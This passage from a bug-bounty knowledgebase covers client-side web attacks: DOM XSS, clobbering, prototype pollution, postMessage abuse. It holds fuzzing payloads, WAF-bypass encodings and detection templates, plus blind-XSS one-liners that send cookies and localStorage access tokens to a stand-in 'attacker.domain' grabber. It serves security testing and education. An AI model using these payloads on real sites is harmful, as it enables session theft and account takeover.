**Details:** `logo_uri` parameter allowed arbitrary URLs. Server fetched and displayed logo without checking Content-Type, allowing HTML/JS execution.

### Case Study 5: DOMPurify mXSS Bypass (Gareth Heyes, 2020)

**Target:** DOMPurify (used by thousands of sites)
**Technique:** Mutation XSS via comment/CDATA confusion
**Impact:** Bypass of industry-standard HTML sanitizer

**Details:** Used `<math><mtext><table><mglyph><style>` nesting to confuse HTML parser. Comments inside style became active after DOM re-ordering, bypassing sanitization.

---

## Fuzzing Payloads

### DOM XSS Polyglot

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### jQuery Fuzzing Payloads

```javascript
// Test various jQuery selectors
$('#<img src=x onerror=alert(1)>')
$('.<img src=x onerror=alert(1)>')
$('[name="<img src=x onerror=alert(1)>"]')
```

### postMessage Fuzzing

```javascript
// Fuzz postMessage handlers
window.postMessage('{"type":"render","content":"<img src=x onerror=alert(1)>"}', '*');
window.postMessage('<img src=x onerror=alert(1)>', '*');
window.postMessage('javascript:alert(1)', '*');
```

### Prototype Pollution Fuzzing

```javascript
// Fuzz common prototype paths
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[onerror]=alert(1)
?__proto__[url]=javascript:alert(1)
?constructor[prototype][onerror]=alert(1)
```

### AngularJS Fuzzing

```javascript
// Test expression parsing
{{alert(1)}}
{{constructor.constructor('alert(1)')()}}
{{$eval('alert(1)')}}
{{x='y';alert(1)}}
```

---

## Automation Workflows

### DOM XSS Scanner Workflow

```bash
# Step 1: Crawl with katana
katana -u https://target.com -d 5 -o urls.txt

# Step 2: Find DOM XSS sources
# Look for URL parameters reflected in JavaScript
grep -E "(location\.hash|location\.search|document\.URL)" urls.txt

# Step 3: Test with dalfox
cat urls.txt | dalfox pipe --silence --only-poc

# Step 4: Check for postMessage handlers
# Use browser devtools or specialized tools
```

### DOM Clobbering Detection

```javascript
// Automated clobbering detection
var html = ["a","abbr","address","area","article","aside","audio","b","base","bdi","bdo","blockquote","body","br","button","canvas","caption","cite","code","col","colgroup","data","datalist","dd","del","details","dfn","dialog","div","dl","dt","em","embed","fieldset","figcaption","figure","footer","form","h1","h2","h3","h4","h5","h6","head","header","hgroup","hr","html","i","iframe","img","input","ins","kbd","label","legend","li","link","main","map","mark","math","menu","meta","meter","nav","noscript","object","ol","optgroup","option","output","p","picture","pre","progress","q","rp","rt","ruby","s","samp","script","section","select","slot","small","source","span","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","u","ul","var","video","wbr"];

var props=[];
for(i=0;i<html.length;i++){
    obj = document.createElement(html[i]);
    for(prop in obj) {
        if(typeof obj[prop] === 'string') {
            try {
                props.push(html[i]+':'+prop);
            }catch(e){}
        }
    }
}
console.log([...new Set(props)].join('\n'));
```

### Prototype Pollution Scanner

```bash
# Use pp-finder
pp-finder -u https://target.com

# Or manually test:
curl "https://target.com/?__proto__[test]=polluted"
# Then check if Object.prototype.test === "polluted"
```

---

## Recon Methodology

### Phase 1: Identify Sources

1. **URL Parameters**: Check all query parameters, hash fragments
2. **postMessage**: Look for message event listeners
3. **Storage**: Check localStorage/sessionStorage reads
4. **Cookies**: Check document.cookie usage
5. **Referrer**: Check document.referrer usage
6. **window.name**: Check window.name reads

### Phase 2: Identify Sinks

1. **HTML Sinks**: `innerHTML`, `outerHTML`, `document.write`
2. **JS Execution**: `eval`, `setTimeout`, `setInterval`, `Function`
3. **Navigation**: `location`, `location.href`, `open()`
4. **jQuery**: `$()`, `.html()`, `.append()`, `.prepend()`
5. **AngularJS**: Template expressions, `$parse`, `$eval`
6. **postMessage**: `postMessage()` calls without origin check

### Phase 3: Trace Taint Flow

1. Map sources to sinks in JavaScript code
2. Identify sanitization/filtering between source and sink
3. Look for bypass opportunities (encoding, parser confusion)

### Phase 4: Exploit Development

1. Craft payload for identified sink
2. Test bypasses for any filters
3. Chain with other vulnerabilities (prototype pollution, clobbering)
4. Develop full exploit chain

### DOM Invader Methodology

1. **Install DOM Invader** (Burp Suite extension)
2. **Enable in Browser** (built into Burp's browser)
3. **Identify Sources**: Automatically highlights sources
4. **Identify Sinks**: Automatically detects sinks
5. **Test Payloads**: Built-in payload library
6. **Trace Execution**: Step-through debugging

---

## Nuclei Templates

### Basic DOM XSS Detection

```yaml
id: dom-xss-basic

info:
  name: Basic DOM XSS Detection
  author: bountyhunter
  severity: medium
  description: Detects potential DOM XSS sources

dna:
  - part: response
    type: regex
    regex:
      - "document\.write\s*\("
      - "innerHTML\s*=\s*"
      - "eval\s*\("
      - "location\.hash"
      - "window\.location"
```

### postMessage Detection

```yaml
id: postmessage-detection

info:
  name: postMessage Handler Detection
  author: bountyhunter
  severity: info
  description: Detects postMessage event listeners

dna:
  - part: response
    type: regex
    regex:
      - "addEventListener\s*\(\s*["']message["']"
      - "\.postMessage\s*\("
```

### DOM Clobbering Detection

```yaml
id: dom-clobbering-detection

info:
  name: DOM Clobbering Potential
  author: bountyhunter
  severity: low
  description: Detects potential DOM clobbering vectors

dna:
  - part: response
    type: regex
    regex:
      - "window\.[a-zA-Z_]+\s*\|\|\s*\{\}"
      - "getElementById\s*\("
      - "id\s*=\s*["'][^"']+["']"
```

### Prototype Pollution Detection

```yaml
id: prototype-pollution-detection

info:
  name: Client-Side Prototype Pollution
  author: bountyhunter
  severity: medium
  description: Detects potential prototype pollution vectors

dna:
  - part: response
    type: regex
    regex:
      - "__proto__"
      - "constructor\["']prototype["']"
      - "Object\.prototype"
```

---

## Tools and Scanners

### DOM XSS Scanners

| Tool | Description | URL |
|------|-------------|-----|
| **Dalfox** | Fast Go-based XSS scanner | https://github.com/hahwul/dalfox |
| **XSStrike** | Python XSS scanner with WAF bypass | https://github.com/s0md3v/XSStrike |
| **domxssscanner** | DOM XSS specific scanner | https://github.com/dwisiswant0/domxssscanner |
| **DOM Invader** | Burp Suite extension for DOM testing | Built into Burp Suite |
| **xsser** | Headless browser XSS detection | https://github.com/epsylon/xsser |
| **XSpear** | Ruby XSS scanner | https://github.com/0xSobky/XSpear |

### DOM Clobbering Tools

| Tool | Description | URL |
|------|-------------|-----|
| **DOMClobbering** | Comprehensive payload list | https://github.com/SoheilKhodayari/DOMClobbering |
| **Dom-Explorer** | HTML parser/sanitizer tester | https://github.com/yeswehack/Dom-Explorer |
| **pp-finder** | Prototype pollution finder | https://github.com/yeswehack/pp-finder |

### Request Smuggling Tools

| Tool | Description | URL |
|------|-------------|-----|
| **HTTP Request Smuggler** | Burp extension | https://github.com/PortSwigger/http-request-smuggler |
| **Turbo Intruder** | Fast HTTP tool | https://github.com/PortSwigger/turbo-intruder |
| **smuggler** | Python request smuggling scanner | https://github.com/defparam/smuggler |

### Recon Tools

| Tool | Description | URL |
|------|-------------|-----|
| **katana** | Fast crawler | https://github.com/projectdiscovery/katana |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **nuclei** | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| **param-miner** | Parameter discovery | https://github.com/PortSwigger/param-miner |

---

## Advanced Research

### Browser-Powered Desync (James Kettle, 2022)

**Key Findings:**
- Client-side desync poisons browser connection pools
- Affects single-server websites and internal networks
- Can be triggered via standard browser fetch/navigation
- Enables cache poisoning, header injection, and XSS

**Detection Methodology:**
1. Find endpoints that ignore Content-Length (static files, redirects)
2. Confirm with browser fetch() + connection ID observation
3. Find gadget for harmful response (HEAD splicing, host-header redirects)
4. Deliver exploit via attacker-controlled page

### DOM Clobbering Strikes Back (Gareth Heyes, 2020)

**Key Findings:**
- DOM Clobbering can clobber 3+ levels deep using forms and iframes
- Chrome's `RadioNodeList` allows `forEach` on clobbered collections
- Anchor `username`/`password` properties can be clobbered via FTP URLs
- Base tag protocol override allows unencoded values

### Bypassing DOMPurify with mXSS (Gareth Heyes, 2020)

**Key Findings:**
- MathML + HTML table re-ordering confuses parser
- Comments inside `<style>` behave differently in HTML vs MathML context
- CDATA sections in Firefox achieve same effect
- Both vectors patched in DOMPurify 2.1 but mutation remains in browsers

### Hidden OAuth Attack Vectors (PortSwigger, 2021)

**Key Findings:**
- Dynamic Client Registration enables SSRF by design
- `redirect_uri` session poisoning via race conditions
- `logo_uri` can lead to XSS if Content-Type not enforced
- WebFinger endpoint enables user enumeration

---

## Bug Bounty Writeups

### Writeup 1: DOM XSS in Google Search (Masato Kinugawa)

**Technique:** Mutation XSS via noscript tag
**Impact:** XSS in Google Search results
**Key Takeaway:** Even the most secure sites can have parser edge cases

### Writeup 2: postMessage XSS on Millions of Sites (Mathias Karlsson)

**Technique:** postMessage origin validation bypass
**Impact:** Universal XSS via vulnerable third-party widget
**Key Takeaway:** Third-party scripts are a massive attack surface

### Writeup 3: Stealing Contact Form Data via postMessage (Frans Rosén)

**Technique:** postMessage frame-jumping + jQuery-JSONP
**Target:** HackerOne Marketo forms
**Impact:** Data exfiltration from embedded forms

### Writeup 4: XSS via Host Header (Michał Bentkowski)

**Technique:** Host header reflected in JavaScript
**Target:** Google Custom Search Engine
**Impact:** Reflected XSS via header manipulation

### Writeup 5: Uber Self-XSS to Global XSS (Jack Whitton)

**Technique:** DOM-based XSS + OAuth flow manipulation
**Target:** Uber authentication flow
**Impact:** Account takeover via XSS

---

## Payload Collections

### XSS Hunter Payloads

```html
<!-- XSS Hunter probe -->
<script src="https://js.rip/attacker.domain"></script>

<!-- Alternative -->
<script src=//attacker.domain></script>

<!-- jQuery getScript -->
<script>$.getScript("//attacker.domain")</script>
```

### Blind XSS Endpoints

- Contact forms
- Ticket support systems
- Referer header (analytics panels)
- User-Agent header (admin panels)
- Comment boxes
- Password reset flows
- File upload metadata

### Blind XSS Data Grabber

```javascript
// One-liner for blind XSS
<script>document.location='http://attacker.domain/XSS/grabber.php?c='+document.cookie</script>

// localStorage token theft
<script>document.location='http://attacker.domain/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
```

### XSS in Files

```xml
<!-- XML XSS -->
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

```svg
<!-- SVG XSS (Green Triangle) -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert(document.domain);</script>
</svg>
```

```markdown
<!-- Markdown XSS -->
[a](javascript:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

---

## WAF Bypasses

### Encoding Bypasses

```javascript
// Unicode escapes
<script>alert('22')</script>

// Hex escapes
<script>eval('alert('33')')</script>

// Octal escapes
<script>eval('alert(1)')</script>

// Decimal to radix
<script>eval(8680439..toString(30))(983801..toString(36))</script>
// parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
```

### Case Variation

```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
<ScRiPt>alert(1)</ScRiPt>
```

### Comment Injection

```html
<scr<script>ipt>alert(1)</scr<script>ipt>
"/><img src=x onerror=alert(1)>
```

### Null Byte / CRLF Injection

```javascript
// Null byte before script
%00<script>alert(1)</script>

// CRLF injection
%0d%0a<script>alert(1)</script>
```

### Double Encoding

```javascript
// Double URL encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E

// Double HTML encoding
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
```

### Template Literal Bypass

```javascript
// Using template literals
<script>`${alert(1)}`</script>
```

---

## Detection Techniques

### Manual Detection

1. **Source Identification**: Search JavaScript for:
   - `location.hash`, `location.search`, `location.href`
   - `document.URL`, `document.documentURI`
   - `document.cookie`, `document.referrer`
   - `window.name`, `localStorage`, `sessionStorage`
   - `postMessage` listeners

2. **Sink Identification**: Search for:
   - `innerHTML`, `outerHTML`, `document.write`
   - `eval`, `setTimeout`, `setInterval`, `Function`
   - `$()`, `.html()`, `.append()`, `.prepend()`
   - `location =`, `location.href =`, `open()`

3. **Taint Analysis**: Trace data from source to sink

### Automated Detection

```bash
# Using dalfox for DOM XSS
dalfox url https://target.com/page?param=test --only-poc

# Using nuclei for postMessage
nuclei -u https://target.com -t postmessage-detection.yaml

# Using DOM Invader in Burp
# 1. Open target in Burp's browser
# 2. Enable DOM Invader
# 3. Look for highlighted sources and sinks
```

### Burp Suite Methodology

1. **Spider/Crawl**: Map the application
2. **JavaScript Analysis**: Review all JS files
3. **DOM Invader**: Enable and browse
4. **Param Miner**: Discover hidden parameters
5. **HTTP Request Smuggler**: Test for desync
6. **Turbo Intruder**: Fuzz endpoints

### Chrome DevTools Methodology

1. **Sources Panel**: Set breakpoints on sinks
2. **Console**: Test `window.name`, `localStorage`
3. **Network**: Monitor postMessage traffic
4. **Application**: Inspect storage, service workers
5. **Security**: Check CSP, origins

---

## References

### PortSwigger Research
- [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
- [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [DOM-based XSS](https://portswigger.net/web-security/dom-based/cross-site-scripting)
- [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back)
- [Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- [Browser-powered desync attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)

### GitHub Resources
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings - DOM Clobbering](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- [pp-finder](https://github.com/yeswehack/pp-finder)
- [domxssscanner](https://github.com/dwisiswant0/domxssscanner)
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [Param Miner](https://github.com/PortSwigger/param-miner)

### Documentation
- [MDN - Document.write()](https://developer.mozilla.org/en-US/docs/Web/API/Document/write)
- [MDN - Element.innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- [MDN - Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [MDN - Location](https://developer.mozilla.org/en-US/docs/Web/API/Location)
- [MDN - URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)

### HackTricks
- [DOM XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-xss.html)
- [Cache Poisoning](https://hacktricks.wiki/en/pentesting-web/cache-deception/index.html)
- [Browser HTTP Request Smuggling](https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/browser-http-request-smuggling.html)
- [OAuth to Account Takeover](https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html)

### Tools
- [Dalfox](https://github.com/hahwul/dalfox)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [Katana](https://github.com/projectdiscovery/katana)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [Param Miner](https://github.com/PortSwigger/param-miner)
- [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

### Bug Bounty Writeups
- [Intigriti - DOM XSS Guide](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-dom-based-xss-vulnerabilities)
- [Intigriti - postMessage Guide](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities)
- [HackerOne - Marketo XSS](https://hackerone.com/reports/398054)
- [HackerOne - reveal.js XSS](https://hackerone.com/reports/691977)

---

> **Disclaimer:** This knowledgebase is for educational and authorized security testing purposes only. Always ensure you have explicit permission before testing any application. The techniques described here can cause serious harm if used maliciously.

> **Last Updated:** 2026-05-24
> **Compiled from:** 30+ authoritative sources including PortSwigger Research, GitHub security repositories, MDN documentation, and real-world bug bounty findings.
